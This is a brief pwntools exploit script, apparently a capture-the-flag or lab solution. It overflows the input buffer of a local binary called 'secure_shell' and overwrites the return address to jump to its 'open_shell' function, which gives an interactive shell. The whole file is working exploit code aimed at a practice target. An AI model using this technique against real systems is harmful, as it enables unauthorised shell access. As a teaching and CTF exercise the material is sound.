from pwn import *

# Connect to the remote target and start the process
remote_host = ssh(host='127.0.0.1', user='user', password='password')
secure_shell = remote_host.process('/home/user/app/secure_shell', env={})
secure_shell.recvuntil(b'Please enter secure shell password:')

# Grab the ELF file
elf = secure_shell.elf

# Create payload
open_shell_address = elf.functions['open_shell'].address
buffer = cyclic(cyclic_find(0x6161616d))
eip = p32(open_shell_address)
payload = buffer + eip

# Send the payload
secure_shell.sendline(payload)

# Interact with the shell
secure_shell.interactive()
